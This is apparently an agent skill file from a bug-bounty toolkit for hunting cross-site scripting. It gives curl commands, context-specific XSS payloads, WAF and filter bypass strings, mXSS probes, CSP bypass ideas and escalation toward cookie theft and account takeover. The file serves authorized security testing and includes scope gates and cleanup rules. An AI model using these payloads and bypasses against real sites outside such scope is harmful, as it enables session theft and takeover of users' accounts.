---
name: zp-xss
description: ZeroProtocol hunter for cross-site scripting - reflected, stored, DOM-based, mXSS and blind. Use when input is reflected into a response, when hunting XSS on a parameter or form, when a DOM sink was found in a JS bundle, when testing a markdown or HTML renderer, when bypassing a WAF or CSP for script execution, or when asked to prove XSS. Demands a unique numeric canary, encoding analysis of the reflection, and browser-verified execution - a reflected payload is not XSS until the browser runs it.
---

# zp-xss - execution, not reflection

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any
request. Exit 1 refuse and name the pattern · 3 stop · 4 stop.

**The rule that kills most bad XSS reports:** your payload appearing in the response body is
not XSS. `<script>` is XSS; `&lt;script&gt;` is correct encoding. The finding is *execution*,
and execution is proven in a browser.

---

## Procedure

**1. Use a unique numeric canary, never `alert(1)`.**

```
zp91234        marker for finding the reflection
alert(91234)   marker for proving execution
```

Practice pages, WAF block pages and the target's own docs are full of `alert(1)` and
`alert('XSS')` as *examples*. A distinctive number is how you know the reflection is yours.
Before believing any hit, check the canary does not appear in the untouched baseline:

```bash
curl -sk "https://$H/search?q=zp91234" -o hit.html
curl -sk "https://$H/search" -o base.html
grep -c zp91234 base.html          # must be 0, or pick another canary
```

**2. Find the reflection and read its context.** The context decides the payload; nothing
else does.

```bash
grep -o -E '.{70}zp91234.{70}' hit.html
```

| Where the canary lands | Context | Payload shape |
|---|---|---|
| `<div>zp91234</div>` | HTML body | `<img src=x onerror=alert(91234)>` |
| `<input value="zp91234">` | attribute, quoted | `" onfocus=alert(91234) autofocus x="` |
| `<input value=zp91234>` | attribute, unquoted | `x onmouseover=alert(91234)` |
| `<a href="zp91234">` | URL | `javascript:alert(91234)` |
| `<script>var a="zp91234"</script>` | JS string | `";alert(91234);//` |
| `<script>var a=zp91234</script>` | JS numeric | `1;alert(91234)` |
| `<!-- zp91234 -->` | comment | `--><img src=x onerror=alert(91234)>` |
| `<style>.x{color:zp91234}</style>` | CSS | rarely executable; look for `expression()` on old IE only |
| inside `<textarea>`/`<title>` | RCDATA | `</textarea><img src=x onerror=alert(91234)>` |
| a JSON response rendered by JS | DOM | trace the sink; server-side encoding is irrelevant |

**3. Classify the encoding you are up against.**

```bash
for p in '<b>zp91234</b>' '"zp91234"' "'zp91234'" '<img src=x onerror=alert(91234)>'; do
  printf '%s -> ' "$p"
  curl -sk --get --data-urlencode "q=$p" "https://$H/search" | grep -oE '.{0,40}zp91234.{0,40}' | head -1
done
```

| Reflection | Meaning |
|---|---|
| `<b>` raw | no encoding. Straight to a payload |
| `&lt;b&gt;` | HTML-encoded. Look for another context, or a mutation path |
| `&quot;` but `<` raw | attribute-safe only. Tag injection works |
| `\"` in a JS string | JS-escaped. Try breaking out with a newline or `</script>` |
| payload absent entirely | filtered, or a WAF. Go to step 5 |
| `<img src=x>` survives but `onerror` stripped | attribute allowlist. Try `onfocus`, `onpointerenter`, SVG |

**4. Walk the ladder for stored and DOM variants.**

- **Stored:** inject into anything another page renders - display name, comment, ticket title,
  filename, label, tag, bio. Then *fetch the rendering page* and check for unescaped output
  there. Stored XSS in a shared surface is worth far more than reflected.
- **DOM:** the server is irrelevant. Find the sink from `zp-js-secrets`
  (`innerHTML`, `document.write`, `eval`, `insertAdjacentHTML`, jQuery `$()`), then trace the
  source (`location.hash`, `location.search`, `document.referrer`, `window.name`,
  `postMessage`). `#` payloads never reach the server, so curl cannot see them - this class
  requires a browser.
- **Blind:** submit into a surface a human reviews later (support ticket, feedback form,
  user-agent logged into an admin panel). Point it at a collector **you control** and wait.
  Without a callback there is no proof, so set that up first.
- **mXSS:** sanitiser output re-parsed differently. Test `<noscript><p title="</noscript>
  <img src=x onerror=alert(91234)>">`, and SVG/MathML foreign-content confusion against
  DOMPurify-style filters.

**5. Bypasses, in the order worth trying.**

```
case:            <ImG sRc=x OnErRoR=alert(91234)>
no parens:       <img src=x onerror=alert`91234`>
no spaces:       <img/src=x/onerror=alert(91234)>
alt events:      onfocus autofocus · onpointerenter · onanimationstart · ontoggle (<details open>)
alt tags:        <svg onload=> · <body onload=> · <details open ontoggle=> · <video><source onerror=>
entity/encoding: &#106;avascript: · %253Cscript%253E (double URL)
unicode:         <script> in a JS context
comment split:   <img src=x o/**/nerror=alert(91234)>
no alert:        <img src=x onerror=print()> · onerror=confirm(91234)
CSP-friendly:    a whitelisted-CDN JSONP endpoint, or a DOM-clobbering gadget
```

Stack the encodings: many WAFs decode once and the app decodes twice.

**6. Prove it in a browser.** Mandatory for every client-side class.

Use a **DOM marker**, not `alert()` - headless browsers suppress dialogs and `alert` proves
nothing in a screenshot:

```js
// payload that leaves durable evidence
<img src=x onerror="document.title='zp-xss-91234';document.body.setAttribute('data-zp','91234')">
```

Then screenshot the page with the changed title, and capture `document.title` from the
console. Note the browser and version - `mXSS` and parser bugs are engine-specific.

**7. Check the CSP before claiming severity.**

```bash
curl -skI "https://$H/" | grep -i content-security-policy
```

A strict CSP (`script-src 'self'` with no `unsafe-inline`, no wildcard CDN) can reduce a real
injection to a non-issue. Say so honestly - and then look for the CSP bypass, because
`unsafe-eval`, a permissive CDN, or a JSONP endpoint on an allowed origin usually restores it.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| canary reflects with raw `<` `>` **and** the browser executes | **confirmed XSS** |
| canary reflects raw, but CSP blocks execution | report as injection with the CSP caveat, or find the bypass. Not "XSS" yet |
| canary reflects HTML-encoded | killed for that context. Try another |
| canary appears only in a `Content-Type: application/json` response | not XSS unless something renders it. Check the consumer |
| canary in a response with `Content-Type: text/plain` | not XSS. Killed |
| canary in a downloaded file (`Content-Disposition: attachment`) | not XSS. Killed |
| self-XSS only (you must paste it into your own console/devtools) | **killed.** Every program rejects it unless chained with CSRF or clickjacking |
| XSS on a sandboxed, cookie-less, unique-origin domain | low to informational. Check what the origin actually holds |
| XSS requiring a victim to already be an admin and paste a payload | killed - too many preconditions |
| stored XSS rendering for other users | **confirmed, high.** This is the version that pays |
| `alert()` fires but only in your own session with your own data | that is self-XSS. Killed |

**The two false positives that waste the most time:** a reflection you never checked for
encoding, and self-XSS. Both look like wins in curl.

---

## High-value patterns

- **Stored XSS in a collaborative surface** - wiki, issue tracker, markdown renderer, shared dashboard. One payload, every viewer.
- **Admin-panel XSS** - session hijack with elevated privilege, or a pivot to account takeover.
- **SSO / login-page XSS** - steals tokens across the whole platform.
- **XSS on a host holding a `Domain=.target.com` cookie** - session theft on the parent, far above a lone XSS.
- **SVG or HTML file upload** served from the app's own origin - bypasses sanitiser and CSP in one step. Route via `zp-upload`.
- **XSS in an email-rendered template** or a PDF generator - often unsanitised and unhunted.
- **DOM XSS via `postMessage`** with a weak origin check - the sink from `zp-js-secrets`.

Escalation, in the order a triager values it: cookie theft (if not `HttpOnly`) -> token
exfiltration from `localStorage` -> CSRF-token read plus a state-changing request -> full
account takeover. Demonstrate the *next* step, not just execution.

---

## Pitfalls

- **Reporting reflection as XSS.** The defining error of this class.
- **Using `alert(1)`** and matching the target's own example text.
- **Not checking the baseline** for your canary.
- **Skipping the browser.** curl cannot see DOM XSS, and cannot prove execution.
- **Ignoring CSP** and claiming Critical on something the browser refuses to run.
- **Submitting self-XSS.** Instant N/A.
- **Testing on real users' data** instead of two accounts you registered.
- **Leaving stored payloads behind.** Delete them, and say in the report that you did.
- **Firing a payload at a support inbox** that a human will open - that is social engineering unless the program allows it.
- **One payload per context and declaring it clean.** Walk the ladder; 25 attempts minimum on a P1 parameter.

---

## Hand off to

Confirmed -> `zp-triage`, then chain before reporting: `zp-authz` (session/cookie scope),
`zp-cors` (can you read cross-origin now), `zp-upload` (SVG/HTML upload vector),
`zp-cache-poison` (can the reflection be cached for other users - that turns reflected into
stored). Sinks you could not reach -> `zp-code-audit` if source is available.
